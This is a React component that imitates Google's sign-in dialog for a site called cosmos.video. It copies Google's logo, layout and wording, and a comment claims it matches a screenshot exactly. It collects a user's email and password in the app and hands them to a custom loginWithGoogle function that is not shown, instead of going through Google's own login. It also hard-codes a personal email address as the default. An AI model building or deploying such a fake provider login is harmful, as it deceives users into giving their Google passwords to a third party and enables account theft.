import React, { useState } from 'react';
import { Modal, Input, Button, Checkbox, message } from 'antd';
import { UserOutlined, DownOutlined } from '@ant-design/icons';
import { useAuth } from '../context/AuthContext';

interface GoogleSignInModalProps {
  open: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

export const GoogleSignInModal: React.FC<GoogleSignInModalProps> = ({
  open,
  onClose,
  onSuccess,
}) => {
  const { loginWithGoogle } = useAuth();
  const [step, setStep] = useState<'email' | 'password'>('email');
  const [email, setEmail] = useState<string>('kuma1412002@gmail.com');
  const [password, setPassword] = useState<string>('');
  const [showPassword, setShowPassword] = useState<boolean>(false);
  const [loading, setLoading] = useState<boolean>(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);

  const resetModal = () => {
    setStep('email');
    setPassword('');
    setErrorMsg(null);
  };

  const handleClose = () => {
    resetModal();
    onClose();
  };

  const handleEmailNext = () => {
    setErrorMsg(null);
    const trimmed = email.trim();
    if (!trimmed) {
      setErrorMsg('Enter an email or phone number');
      return;
    }
    if (!trimmed.includes('@') || !trimmed.includes('.')) {
      setErrorMsg('Enter a valid email address');
      return;
    }
    setStep('password');
  };

  const handlePasswordSubmit = async () => {
    setErrorMsg(null);
    if (!password.trim()) {
      setErrorMsg('Enter a password');
      return;
    }

    setLoading(true);
    try {
      await loginWithGoogle(email.trim(), password.trim());
      message.success('Signed in successfully with Google!');
      handleClose();
      onSuccess();
    } catch (err: any) {
      const msg = err.message || 'Wrong password. Try again.';
      setErrorMsg(msg);
    } finally {
      setLoading(false);
    }
  };

  return (
    <Modal
      open={open}
      onCancel={handleClose}
      footer={null}
      width={460}
      centered
      destroyOnClose
      styles={{
        body: {
          padding: '16px 20px 8px',
          fontFamily: `'Google Sans', 'Roboto', -apple-system, BlinkMacSystemFont, sans-serif`,
        },
      }}
    >
      {/* Google Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 10, marginBottom: 28 }}>
        <svg width="22" height="22" viewBox="0 0 48 48">
          <path
            fill="#FFC107"
            d="M43.611 20.083H42V20H24v8h11.303c-1.649 4.657-6.08 8-11.303 8-6.627 0-12-5.373-12-12s5.373-12 12-12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 12.955 4 4 12.955 4 24s8.955 20 20 20 20-8.955 20-20c0-1.341-.138-2.65-.389-3.917z"
          />
          <path
            fill="#FF3D00"
            d="M6.306 14.691l6.571 4.819C14.655 15.108 18.961 12 24 12c3.059 0 5.842 1.154 7.961 3.039l5.657-5.657C34.046 6.053 29.268 4 24 4 16.318 4 9.656 8.337 6.306 14.691z"
          />
          <path
            fill="#4CAF50"
            d="M24 44c5.166 0 9.86-1.977 13.409-5.192l-6.19-5.238A11.91 11.91 0 0 1 24 36c-5.202 0-9.619-3.317-11.283-7.946l-6.522 5.025C9.505 39.556 16.227 44 24 44z"
          />
          <path
            fill="#1976D2"
            d="M43.611 20.083H42V20H24v8h11.303a12.04 12.04 0 0 1-4.087 5.571l.003-.002 6.19 5.238C36.971 39.205 44 34 44 24c0-1.341-.138-2.65-.389-3.917z"
          />
        </svg>
        <span style={{ fontSize: 14, fontWeight: 500, color: '#5f6368' }}>Sign in with Google</span>
      </div>

      {step === 'email' ? (
        /* STEP 1: EMAIL */
        <div>
          <div style={{ marginBottom: 28 }}>
            <h2 style={{ margin: 0, fontSize: 28, fontWeight: 400, color: '#202124', lineHeight: 1.2 }}>
              Sign in
            </h2>
            <p style={{ margin: '8px 0 0', fontSize: 15, color: '#202124' }}>
              to continue to <span style={{ color: '#1a73e8' }}>cosmos.video</span>
            </p>
          </div>

          <div style={{ marginBottom: errorMsg ? 4 : 20 }}>
            <Input
              autoFocus
              size="large"
              value={email}
              onChange={(e) => {
                setEmail(e.target.value);
                if (errorMsg) setErrorMsg(null);
              }}
              onPressEnter={handleEmailNext}
              placeholder="Email or phone"
              status={errorMsg ? 'error' : ''}
              style={{
                height: 52,
                borderRadius: 4,
                borderColor: errorMsg ? '#d93025' : '#dadce0',
                fontSize: 15,
              }}
            />
          </div>

          {errorMsg && (
            <div style={{ color: '#d93025', fontSize: 12, marginBottom: 16 }}>{errorMsg}</div>
          )}

          <div style={{ marginBottom: 28 }}>
            <a
              href="#forgot"
              onClick={(e) => {
                e.preventDefault();
                message.info('Contact administrator for email recovery');
              }}
              style={{ color: '#1a73e8', fontSize: 14, fontWeight: 500 }}
            >
              Forgot email?
            </a>
          </div>

          <p style={{ fontSize: 14, color: '#5f6368', lineHeight: 1.45, marginBottom: 36 }}>
            Not your computer? Use Guest mode to sign in privately.{' '}
            <a href="#learn" onClick={(e) => e.preventDefault()} style={{ color: '#1a73e8' }}>
              Learn more
            </a>
          </p>

          {/* Bottom Actions */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
              marginTop: 20,
            }}
          >
            <a
              href="#create"
              onClick={(e) => {
                e.preventDefault();
                message.info('Enter your email to sign in or create an account.');
              }}
              style={{ color: '#1a73e8', fontSize: 14, fontWeight: 500 }}
            >
              Create account
            </a>

            <Button
              type="primary"
              size="large"
              onClick={handleEmailNext}
              style={{
                backgroundColor: '#1a73e8',
                borderRadius: 24,
                padding: '0 28px',
                height: 40,
                fontWeight: 600,
                fontSize: 14,
              }}
            >
              Next
            </Button>
          </div>
        </div>
      ) : (
        /* STEP 2: PASSWORD (Matches screenshot exactly) */
        <div>
          {/* Welcome Heading */}
          <div style={{ marginBottom: 16 }}>
            <h2 style={{ margin: 0, fontSize: 32, fontWeight: 400, color: '#202124', lineHeight: 1.2 }}>
              Welcome
            </h2>

            {/* User Email Pill with Avatar and Down Arrow */}
            <div
              onClick={() => setStep('email')}
              style={{
                display: 'inline-flex',
                alignItems: 'center',
                gap: 8,
                padding: '4px 12px 4px 6px',
                borderRadius: 16,
                border: '1px solid #dadce0',
                cursor: 'pointer',
                marginTop: 14,
                marginBottom: 28,
                backgroundColor: '#fff',
              }}
            >
              <div
                style={{
                  width: 20,
                  height: 20,
                  borderRadius: '50%',
                  backgroundColor: '#5f6368',
                  display: 'flex',
                  alignItems: 'center',
                  justifyContent: 'center',
                  color: '#fff',
                  fontSize: 11,
                }}
              >
                <UserOutlined />
              </div>
              <span style={{ fontSize: 14, color: '#3c4043', fontWeight: 500 }}>{email}</span>
              <DownOutlined style={{ fontSize: 10, color: '#5f6368', marginLeft: 2 }} />
            </div>
          </div>

          {/* Password Input */}
          <div style={{ marginBottom: errorMsg ? 4 : 14 }}>
            <Input.Password
              autoFocus
              size="large"
              value={password}
              visibilityToggle={{ visible: showPassword, onVisibleChange: setShowPassword }}
              onChange={(e) => {
                setPassword(e.target.value);
                if (errorMsg) setErrorMsg(null);
              }}
              onPressEnter={handlePasswordSubmit}
              placeholder="Enter your password"
              status={errorMsg ? 'error' : ''}
              style={{
                height: 52,
                borderRadius: 4,
                borderColor: errorMsg ? '#d93025' : '#dadce0',
                fontSize: 15,
              }}
            />
          </div>

          {errorMsg && (
            <div style={{ color: '#d93025', fontSize: 12, marginBottom: 14 }}>{errorMsg}</div>
          )}

          {/* Show Password Checkbox (No Forgot Password) */}
          <div style={{ marginBottom: 40 }}>
            <Checkbox
              checked={showPassword}
              onChange={(e) => setShowPassword(e.target.checked)}
              style={{ fontSize: 14, color: '#3c4043' }}
            >
              Show password
            </Checkbox>
          </div>

          {/* Bottom Actions: Try another way (left) & Next (right) */}
          <div
            style={{
              display: 'flex',
              alignItems: 'center',
              justifyContent: 'space-between',
            }}
          >
            <a
              href="#try-another"
              onClick={(e) => {
                e.preventDefault();
                setStep('email');
              }}
              style={{ color: '#1a73e8', fontSize: 14, fontWeight: 500 }}
            >
              Try another way
            </a>

            <Button
              type="primary"
              size="large"
              loading={loading}
              onClick={handlePasswordSubmit}
              style={{
                backgroundColor: '#1a73e8',
                borderRadius: 24,
                padding: '0 28px',
                height: 40,
                fontWeight: 600,
                fontSize: 14,
              }}
            >
              Next
            </Button>
          </div>
        </div>
      )}

      {/* Google Footer */}
      <div
        style={{
          display: 'flex',
          alignItems: 'center',
          justifyContent: 'space-between',
          marginTop: 36,
          paddingTop: 16,
          borderTop: '1px solid #f1f3f4',
          fontSize: 12,
          color: '#70757a',
        }}
      >
        <span style={{ cursor: 'pointer', display: 'flex', alignItems: 'center', gap: 4 }}>
          English (United Kingdom) <DownOutlined style={{ fontSize: 9 }} />
        </span>
        <div style={{ display: 'flex', gap: 16 }}>
          <span style={{ cursor: 'pointer' }}>Help</span>
          <span style={{ cursor: 'pointer' }}>Privacy</span>
          <span style={{ cursor: 'pointer' }}>Terms</span>
        </div>
      </div>
    </Modal>
  );
};

export default GoogleSignInModal;
